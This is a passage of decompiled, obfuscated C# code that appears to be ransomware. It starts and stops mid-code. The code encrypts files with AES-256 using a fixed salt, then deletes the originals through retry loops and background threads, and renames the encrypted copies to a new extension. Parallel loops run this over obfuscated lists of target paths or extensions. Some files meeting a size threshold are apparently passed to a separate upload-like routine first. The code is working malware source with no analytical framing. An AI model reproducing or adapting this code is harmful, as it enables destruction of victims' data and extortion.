									CPTiJxEiqbG(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, GNzSmqEhxfDdOM);
								}
								else
								{
									CPTiJxEiqbG(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!hWWikjLPcgd)
									{
										WxPAFRGwcjiPOHT(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, GNzSmqEhxfDdOM);
									}
									else
									{
										WxPAFRGwcjiPOHT(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (TiKXhRWKbmQI)
									{
										try
										{
											File.AppendAllText(NPfFzxrRnHyw, ILaHbrWVQTp.getString_0(107391196) + CS_0024_003C_003E8__locals0.THbMIWrcVCD + ILaHbrWVQTp.getString_0(107391401) + ex6.Message + ILaHbrWVQTp.getString_0(107396602));
										}
										catch (Exception)
										{
										}
									}
									bVOffGsglMxM++;
									return;
								}
							}
						}
						else if (!FwNVRjoRuJX)
						{
							if (!hWWikjLPcgd)
							{
								CPTiJxEiqbG(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + ILaHbrWVQTp.getString_0(107391442), GNzSmqEhxfDdOM);
							}
							else
							{
								CPTiJxEiqbG(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + ILaHbrWVQTp.getString_0(107391442), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!hWWikjLPcgd)
								{
									WxPAFRGwcjiPOHT(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD, GNzSmqEhxfDdOM);
								}
								else
								{
									WxPAFRGwcjiPOHT(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (TiKXhRWKbmQI)
								{
									try
									{
										File.AppendAllText(NPfFzxrRnHyw, ILaHbrWVQTp.getString_0(107391196) + CS_0024_003C_003E8__locals0.THbMIWrcVCD + ILaHbrWVQTp.getString_0(107391401) + ex8.Message + ILaHbrWVQTp.getString_0(107396602));
									}
									catch (Exception)
									{
									}
								}
								bVOffGsglMxM++;
								return;
							}
						}
						if (hWWikjLPcgd)
						{
							if (CS_0024_003C_003E8__locals0.LUAEFZkwQdyp != ILaHbrWVQTp.getString_0(107391447))
							{
								AXWEfwzISuVXUHm(CS_0024_003C_003E8__locals0.THbMIWrcVCD + CS_0024_003C_003E8__locals0.LUAEFZkwQdyp, bytes2);
							}
							else
							{
								AXWEfwzISuVXUHm(CS_0024_003C_003E8__locals0.THbMIWrcVCD, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			CS_0024_003C_003E8__locals0.sNGFtOfLZdgOwtG.Remove(CS_0024_003C_003E8__locals0.THbMIWrcVCD);
		});
	}

	private static void orRipiqqQVNW(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (uCcQuMnxchHHlJ == getString_0(107397207))
					{
						foreach (string item in ckZUdJlJosB)
						{
							if (string_0.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == getString_0(107397207))
							{
								if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393326), getString_0(107393353), getString_0(107393340), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == getString_0(107396732))
							{
								try
								{
									OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393326), getString_0(107393353), getString_0(107393340), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107391425)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107391425), getString_0(107393277)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void WxPAFRGwcjiPOHT(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (uCcQuMnxchHHlJ == getString_0(107397207))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in ckZUdJlJosB)
			{
				if (string_0.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == getString_0(107397207))
				{
					if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393326), getString_0(107393353), getString_0(107393340), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == getString_0(107396732))
				{
					try
					{
						OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393326), getString_0(107393353), getString_0(107393340), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = XiKgJtUmrYMpicU.iYGTeDkvafUG(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		LhieCrHWKTUqOfg++;
	}

	private static void CPTiJxEiqbG(string string_0, string string_1, byte[] byte_0)
	{
		cEGWxmeHJaEO CS_0024_003C_003E8__locals0 = new cEGWxmeHJaEO();
		CS_0024_003C_003E8__locals0.OpWwBEgJloHZa = string_0;
		CS_0024_003C_003E8__locals0.KRVZpOwKJSp = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string kRVZpOwKJSp = CS_0024_003C_003E8__locals0.KRVZpOwKJSp;
			FileStream fileStream = new FileStream(kRVZpOwKJSp, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (qpGYoLASDOB == getString_0(107397207))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.OpWwBEgJloHZa, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.OpWwBEgJloHZa, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.OpWwBEgJloHZa, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.KRVZpOwKJSp.Length > 0)
				{
					if (uCcQuMnxchHHlJ == getString_0(107397207))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.OpWwBEgJloHZa, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in ckZUdJlJosB)
						{
							if (CS_0024_003C_003E8__locals0.OpWwBEgJloHZa.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == getString_0(107397207))
							{
								if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393326), getString_0(107393353), getString_0(107393340), CS_0024_003C_003E8__locals0.OpWwBEgJloHZa);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.OpWwBEgJloHZa.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == getString_0(107396732))
							{
								try
								{
									OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393326), getString_0(107393353), getString_0(107393340), CS_0024_003C_003E8__locals0.OpWwBEgJloHZa);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.OpWwBEgJloHZa);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.KRVZpOwKJSp.EndsWith(getString_0(107391425)))
					{
						File.Move(CS_0024_003C_003E8__locals0.KRVZpOwKJSp, CS_0024_003C_003E8__locals0.KRVZpOwKJSp.Replace(getString_0(107391425), getString_0(107393277)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.KRVZpOwKJSp))
							{
								File.Delete(CS_0024_003C_003E8__locals0.KRVZpOwKJSp);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (TiKXhRWKbmQI)
			{
				try
				{
					File.AppendAllText(NPfFzxrRnHyw, getString_0(107391179) + CS_0024_003C_003E8__locals0.OpWwBEgJloHZa + getString_0(107391384) + ex2.Message + getString_0(107396585));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> ziZdlGZQMKRIPJ = ZiZdlGZQMKRIPJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				rCeUKIVeLnQH(getString_0(107391363), string_0);
			};
		}
		Parallel.ForEach(ziZdlGZQMKRIPJ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> source = ussIlYOuJVMgKunLO;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				rCeUKIVeLnQH(getString_0(107390810), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> ouiVTcbGPHuSa = OuiVTcbGPHuSa;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390797)), string_0);
			};
		}
		Parallel.ForEach(ouiVTcbGPHuSa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (vnYzvmwacjUdjV == getString_0(107397207))
		{
			string[] jeQJajbHDJTGCnq = JeQJajbHDJTGCnq;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390797)), getString_0(107390772) + string_0 + getString_0(107390795));
				};
			}
			Parallel.ForEach(jeQJajbHDJTGCnq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!HqqBLCvmqImsbDmo().Contains(getString_0(107391557)))
		{
			NRNysAWtZWK(wbCfMjGPdcW);
		}
		else
		{
			List<string> kSsRoxGqodAS = KSsRoxGqodAS;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					rCeUKIVeLnQH(HVpeMrZfkFlb(wToEnzHBmDVrI(getString_0(107390790))), string_0);
				};
			}
			Parallel.ForEach(kSsRoxGqodAS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> source2 = yRBEUVLZlAnEdd;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390733)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> source3 = hJJkXeuiqGz;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				rCeUKIVeLnQH(getString_0(107390748), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		rCeUKIVeLnQH(getString_0(107391363), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		rCeUKIVeLnQH(getString_0(107390810), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390797)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390797)), getString_0(107390772) + string_0 + getString_0(107390795));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		rCeUKIVeLnQH(HVpeMrZfkFlb(wToEnzHBmDVrI(getString_0(107390790))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390733)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		rCeUKIVeLnQH(getString_0(107390748), string_0);
	}

	static opmuuofbUtOT()
	{
		Strings.CreateGetStringDelegate(typeof(opmuuofbUtOT));
		LGeZrzTAyQiZ = getString_0(107390707);
		GNzSmqEhxfDdOM = null;
		zxNLGOSViKvsF = getString_0(107396732);
		SPQmigmjIMVgui = getString_0(107390730);
		HvDislcBmvfwEiZ = new List<string>();
		NcfZxRUWHNhp = new List<string>();
		EiNdgqcqTVoi = getString_0(107396732);
		kXRqipnIRdWIwO = getString_0(107393277);
		eQkgiuFNXIleWNVL = getString_0(107393277);
		FRYGqIQyiT = getString_0(107396732);
		iyTOxLsoiMVpH = 0;
		LHgKOtaABYHh = getString_0(107396732);
		YqfHjDCVzC = getString_0(107396732);
		HssaJUOvJGbgq = getString_0(107396732);
		OcxUzttKCHCEy = getString_0(107390717);
		JmAxKbKLelPxJ = getString_0(107396732);
		hlkaCQLrtXa = getString_0(107396732);
		mFrQbxzEMdalqU = getString_0(107396732);
		VTSwHYDZTQkjt = getString_0(107396732);
		bvTdfKIEWRmqB = new List<string>
		{
			HVpeMrZfkFlb(getString_0(107390680)),
			HVpeMrZfkFlb(getString_0(107390695)),
			HVpeMrZfkFlb(getString_0(107390638)),
			HVpeMrZfkFlb(getString_0(107390653)),
			HVpeMrZfkFlb(getString_0(107390628)),
			HVpeMrZfkFlb(getString_0(107390603)),
			HVpeMrZfkFlb(getString_0(107391066)),
			HVpeMrZfkFlb(getString_0(107391073)),
			HVpeMrZfkFlb(getString_0(107391048)),
			HVpeMrZfkFlb(getString_0(107390991)),
			HVpeMrZfkFlb(getString_0(107391006)),
			HVpeMrZfkFlb(getString_0(107390981)),
			HVpeMrZfkFlb(getString_0(107390924))
		};
		RVpXhPaEOqMSkG = new List<string>();
		fQxmapBHYBLOfG = getString_0(107396732);
		fPYzRKhyuWBoW = getString_0(107396732);
		kaZaMjdPEXXy = getString_0(107396732);
		fpmCyTaZQjAm = new List<string>();
		YUqmLHcOKx = getString_0(107396732);
		lwzGwXJiBdgk = getString_0(107390899);
		yOLtwErlSIuUuw = getString_0(107396732);
		xJcKVJAUPnxQimi = getString_0(107396732);
		ussIlYOuJVMgKunLO = new List<string>
		{
			HVpeMrZfkFlb(getString_0(107390882)),
			HVpeMrZfkFlb(getString_0(107390849)),
			HVpeMrZfkFlb(getString_0(107390304)),
			HVpeMrZfkFlb(getString_0(107390271)),
			HVpeMrZfkFlb(getString_0(107390238)),
			HVpeMrZfkFlb(getString_0(107390209)),
			HVpeMrZfkFlb(getString_0(107390152)),
			HVpeMrZfkFlb(getString_0(107390123)),
			HVpeMrZfkFlb(getString_0(107390078)),
			HVpeMrZfkFlb(getString_0(107390525)),
			HVpeMrZfkFlb(getString_0(107390492)),
			HVpeMrZfkFlb(getString_0(107390427)),
			HVpeMrZfkFlb(getString_0(107390394)),
			HVpeMrZfkFlb(getString_0(107390397)),
			HVpeMrZfkFlb(getString_0(107390368)),
			HVpeMrZfkFlb(getString_0(107389783)),
			HVpeMrZfkFlb(getString_0(107389742)),
			HVpeMrZfkFlb(getString_0(107389685)),
			HVpeMrZfkFlb(getString_0(107389668)),
			HVpeMrZfkFlb(getString_0(107389635)),
			HVpeMrZfkFlb(getString_0(107389606)),
			HVpeMrZfkFlb(getString_0(107389565)),
			HVpeMrZfkFlb(getString_0(107390004)),
			HVpeMrZfkFlb(getString_0(107389971)),
			HVpeMrZfkFlb(getString_0(107389954)),
			HVpeMrZfkFlb(getString_0(107389897)),
			HVpeMrZfkFlb(getString_0(107389856)),
			HVpeMrZfkFlb(getString_0(107389827)),
			HVpeMrZfkFlb(getString_0(107389242)),
			HVpeMrZfkFlb(getString_0(107389217)),
			HVpeMrZfkFlb(getString_0(107389152)),
			HVpeMrZfkFlb(getString_0(107389095)),
			HVpeMrZfkFlb(getString_0(107389542)),
			HVpeMrZfkFlb(getString_0(107389461)),
			HVpeMrZfkFlb(getString_0(107389396)),
			HVpeMrZfkFlb(getString_0(107389339)),
			HVpeMrZfkFlb(getString_0(107389306)),
			HVpeMrZfkFlb(getString_0(107388753)),
			HVpeMrZfkFlb(getString_0(107388744)),
			HVpeMrZfkFlb(getString_0(107388667)),
			HVpeMrZfkFlb(getString_0(107388670)),
			HVpeMrZfkFlb(getString_0(107388605)),
			HVpeMrZfkFlb(getString_0(107388532)),
			HVpeMrZfkFlb(getString_0(107389011)),
			HVpeMrZfkFlb(getString_0(107389002)),
			HVpeMrZfkFlb(getString_0(107388921)),
			HVpeMrZfkFlb(getString_0(107388876)),
			HVpeMrZfkFlb(getString_0(107388835)),
			HVpeMrZfkFlb(getString_0(107388246)),
			HVpeMrZfkFlb(getString_0(107388233)),
			HVpeMrZfkFlb(getString_0(107388188)),
			HVpeMrZfkFlb(getString_0(107388115)),
			HVpeMrZfkFlb(getString_0(107388074)),
			HVpeMrZfkFlb(getString_0(107388013)),
			HVpeMrZfkFlb(getString_0(107388516)),
			HVpeMrZfkFlb(getString_0(107388451)),
			HVpeMrZfkFlb(getString_0(107388374)),
			HVpeMrZfkFlb(getString_0(107388345)),
			HVpeMrZfkFlb(getString_0(107388300)),
			HVpeMrZfkFlb(getString_0(107387755)),
			HVpeMrZfkFlb(getString_0(107387694)),
			HVpeMrZfkFlb(getString_0(107387637)),
			HVpeMrZfkFlb(getString_0(107387572)),
			HVpeMrZfkFlb(getString_0(107387563)),
			HVpeMrZfkFlb(getString_0(107387502)),
			HVpeMrZfkFlb(getString_0(107388005)),
			HVpeMrZfkFlb(getString_0(107387892)),
			HVpeMrZfkFlb(getString_0(107387831)),
			HVpeMrZfkFlb(getString_0(107387758)),
			HVpeMrZfkFlb(getString_0(107387233)),
			HVpeMrZfkFlb(getString_0(107387200)),
			HVpeMrZfkFlb(getString_0(107387127)),
			HVpeMrZfkFlb(getString_0(107387082)),
			HVpeMrZfkFlb(getString_0(107387037)),
			HVpeMrZfkFlb(getString_0(107387460)),
			HVpeMrZfkFlb(getString_0(107387379)),
			HVpeMrZfkFlb(getString_0(107387350)),
			HVpeMrZfkFlb(getString_0(107387309)),
			HVpeMrZfkFlb(getString_0(107387244)),
			HVpeMrZfkFlb(getString_0(107386683)),
			HVpeMrZfkFlb(getString_0(107386658)),
			HVpeMrZfkFlb(getString_0(107386625)),
			HVpeMrZfkFlb(getString_0(107386564)),
			HVpeMrZfkFlb(getString_0(107386507)),
			HVpeMrZfkFlb(getString_0(107389339)),
			HVpeMrZfkFlb(getString_0(107386930)),
			HVpeMrZfkFlb(getString_0(107386921)),
			HVpeMrZfkFlb(getString_0(107386800)),
			HVpeMrZfkFlb(getString_0(107386787)),
			HVpeMrZfkFlb(getString_0(107386214)),
			HVpeMrZfkFlb(getString_0(107386157)),
			HVpeMrZfkFlb(getString_0(107386144)),
			HVpeMrZfkFlb(getString_0(107386063)),
			HVpeMrZfkFlb(getString_0(107389217)),
			HVpeMrZfkFlb(getString_0(107385998)),
			HVpeMrZfkFlb(getString_0(107385989)),
			HVpeMrZfkFlb(getString_0(107386412)),
			HVpeMrZfkFlb(getString_0(107389152)),
			HVpeMrZfkFlb(getString_0(107386371)),
			HVpeMrZfkFlb(getString_0(107386290)),
			HVpeMrZfkFlb(getString_0(107385689)),
			HVpeMrZfkFlb(getString_0(107385624)),
			HVpeMrZfkFlb(getString_0(107385607)),
			HVpeMrZfkFlb(getString_0(107389542)),
			HVpeMrZfkFlb(getString_0(107385498)),
			HVpeMrZfkFlb(getString_0(107389306)),
			HVpeMrZfkFlb(getString_0(107389461)),
			HVpeMrZfkFlb(getString_0(107385465)),
			HVpeMrZfkFlb(getString_0(107385952)),
			HVpeMrZfkFlb(getString_0(107389396)),
			HVpeMrZfkFlb(getString_0(107385919)),
			HVpeMrZfkFlb(getString_0(107385838)),
			HVpeMrZfkFlb(getString_0(107385821)),
			HVpeMrZfkFlb(getString_0(107389242)),
			HVpeMrZfkFlb(getString_0(107385796)),
			HVpeMrZfkFlb(getString_0(107385719)),
			HVpeMrZfkFlb(getString_0(107385178)),
			HVpeMrZfkFlb(getString_0(107385181)),
			HVpeMrZfkFlb(getString_0(107385104)),
			HVpeMrZfkFlb(getString_0(107385071)),
			HVpeMrZfkFlb(getString_0(107385046)),
			HVpeMrZfkFlb(getString_0(107385033)),
			HVpeMrZfkFlb(getString_0(107384976)),
			HVpeMrZfkFlb(getString_0(107384967)),
			HVpeMrZfkFlb(getString_0(107385402)),
			HVpeMrZfkFlb(getString_0(107385385)),
			HVpeMrZfkFlb(getString_0(107385296)),
			HVpeMrZfkFlb(getString_0(107385263)),
			HVpeMrZfkFlb(getString_0(107385250)),
			HVpeMrZfkFlb(getString_0(107385217)),
			HVpeMrZfkFlb(getString_0(107384632)),
			HVpeMrZfkFlb(getString_0(107389827)),
			HVpeMrZfkFlb(getString_0(107385385)),
			HVpeMrZfkFlb(getString_0(107384591)),
			HVpeMrZfkFlb(getString_0(107384562)),
			HVpeMrZfkFlb(getString_0(107384533)),
			HVpeMrZfkFlb(getString_0(107384516)),
			HVpeMrZfkFlb(getString_0(107384443)),
			HVpeMrZfkFlb(getString_0(107384926)),
			HVpeMrZfkFlb(getString_0(107384821)),
			HVpeMrZfkFlb(getString_0(107384792)),
			HVpeMrZfkFlb(getString_0(107384759)),
			HVpeMrZfkFlb(getString_0(107384686)),
			HVpeMrZfkFlb(getString_0(107384145)),
			HVpeMrZfkFlb(getString_0(107384132)),
			HVpeMrZfkFlb(getString_0(107384067)),
			HVpeMrZfkFlb(getString_0(107384034)),
			HVpeMrZfkFlb(getString_0(107383957)),
			HVpeMrZfkFlb(getString_0(107384408)),
			HVpeMrZfkFlb(getString_0(107384375)),
			HVpeMrZfkFlb(getString_0(107384362)),
			HVpeMrZfkFlb(getString_0(107384297)),
			HVpeMrZfkFlb(getString_0(107384264)),
			HVpeMrZfkFlb(getString_0(107384223)),
			HVpeMrZfkFlb(getString_0(107383630)),
			HVpeMrZfkFlb(getString_0(107389954)),
			HVpeMrZfkFlb(getString_0(107383601)),
			HVpeMrZfkFlb(getString_0(107383544)),
			HVpeMrZfkFlb(getString_0(107383503)),
			HVpeMrZfkFlb(getString_0(107383490)),
			HVpeMrZfkFlb(getString_0(107383417)),
			HVpeMrZfkFlb(getString_0(107383884)),
			HVpeMrZfkFlb(getString_0(107383823)),
			HVpeMrZfkFlb(getString_0(107383806)),
			HVpeMrZfkFlb(getString_0(107383725)),
			HVpeMrZfkFlb(getString_0(107383668)),
			HVpeMrZfkFlb(getString_0(107383099)),
			HVpeMrZfkFlb(getString_0(107383054)),
			HVpeMrZfkFlb(getString_0(107383045)),
			HVpeMrZfkFlb(getString_0(107382956)),
			HVpeMrZfkFlb(getString_0(107389897)),
			HVpeMrZfkFlb(getString_0(107382915)),
			HVpeMrZfkFlb(getString_0(107383398)),
			HVpeMrZfkFlb(getString_0(107383365)),
			HVpeMrZfkFlb(getString_0(107383324)),
			HVpeMrZfkFlb(getString_0(107383295)),
			HVpeMrZfkFlb(getString_0(107389971)),
			HVpeMrZfkFlb(getString_0(107383222)),
			HVpeMrZfkFlb(getString_0(107383205)),
			HVpeMrZfkFlb(getString_0(107383176)),
			HVpeMrZfkFlb(getString_0(107387694)),
			HVpeMrZfkFlb(getString_0(107382631)),
			HVpeMrZfkFlb(getString_0(107383176)),
			HVpeMrZfkFlb(getString_0(107382602)),
			HVpeMrZfkFlb(getString_0(107382541)),
			HVpeMrZfkFlb(getString_0(107382512)),
			HVpeMrZfkFlb(getString_0(107382495)),
			HVpeMrZfkFlb(getString_0(107382414)),
			HVpeMrZfkFlb(getString_0(107382405)),
			HVpeMrZfkFlb(getString_0(107382856)),
			HVpeMrZfkFlb(getString_0(107382827)),
			HVpeMrZfkFlb(getString_0(107382786)),
			HVpeMrZfkFlb(getString_0(107382709)),
			HVpeMrZfkFlb(getString_0(107382696)),
			HVpeMrZfkFlb(getString_0(107382663)),
			HVpeMrZfkFlb(getString_0(107382062)),
			HVpeMrZfkFlb(getString_0(107382049)),
			HVpeMrZfkFlb(getString_0(107381992)),
			HVpeMrZfkFlb(getString_0(107381959)),
			HVpeMrZfkFlb(getString_0(107381918)),
			HVpeMrZfkFlb(getString_0(107381889)),
			HVpeMrZfkFlb(getString_0(107382340)),
			HVpeMrZfkFlb(getString_0(107382307)),
			HVpeMrZfkFlb(getString_0(107382250)),
			HVpeMrZfkFlb(getString_0(107382209)),
			HVpeMrZfkFlb(getString_0(107382128)),
			HVpeMrZfkFlb(getString_0(107381583)),
			HVpeMrZfkFlb(getString_0(107381566)),
			HVpeMrZfkFlb(getString_0(107381489)),
			HVpeMrZfkFlb(getString_0(107381472)),
			HVpeMrZfkFlb(getString_0(107381395)),
			HVpeMrZfkFlb(getString_0(107381378)),
			HVpeMrZfkFlb(getString_0(107381857)),
			HVpeMrZfkFlb(getString_0(107381784)),
			HVpeMrZfkFlb(getString_0(107381743)),
			HVpeMrZfkFlb(getString_0(107381730)),
			HVpeMrZfkFlb(getString_0(107384443)),
			HVpeMrZfkFlb(getString_0(107381697)),
			HVpeMrZfkFlb(getString_0(107381624)),
			HVpeMrZfkFlb(getString_0(107381087)),
